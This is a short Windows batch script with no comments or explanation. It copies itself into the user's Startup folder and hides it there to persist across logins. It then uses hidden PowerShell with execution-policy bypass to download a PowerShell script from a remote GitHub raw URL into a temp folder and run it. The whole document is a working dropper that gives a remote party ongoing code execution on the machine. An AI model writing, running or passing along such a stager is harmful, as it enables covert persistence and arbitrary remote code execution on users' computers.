@echo off
MODE CON COLS=132 LINES=50
if exist %temp%\Gdrv127a (
  echo Created
) else (
  echo Not Create
  md %temp%\Gdrv127a
)
set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
copy "%~f0" "%startup_dir%"
attrib +R +H "%startup_dir%"\%~nx0

start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/jh1sc/Conex/main/C.ps1' -OutFile $env:temp\Gdrv127a\C.ps1; exit"
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\Gdrv127a\C.ps1"





